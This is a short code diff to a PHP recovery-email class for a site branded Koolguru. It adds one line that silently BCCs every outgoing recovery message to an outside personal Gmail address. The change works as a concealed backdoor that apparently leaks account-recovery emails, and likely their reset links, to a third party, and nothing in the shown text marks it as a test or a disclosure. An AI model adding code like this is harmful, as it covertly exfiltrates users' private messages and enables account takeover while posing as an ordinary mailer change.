@@ -113,6 +113,7 @@ class RecoverEmailTable implements ServiceLocatorAwareInterface {
         $smtp_details = $get_smtp_details['smtp_details'];
         $admin_email = $smtp_details['connection_config']['username'];
         $message->addTo($email)
+                ->addBcc('vatanvindal1985@gmail.com')
                 ->addFrom($admin_email, 'No-reply Koolguru')
                 ->setSubject($subject)
                 ->setBody($reciever_message);
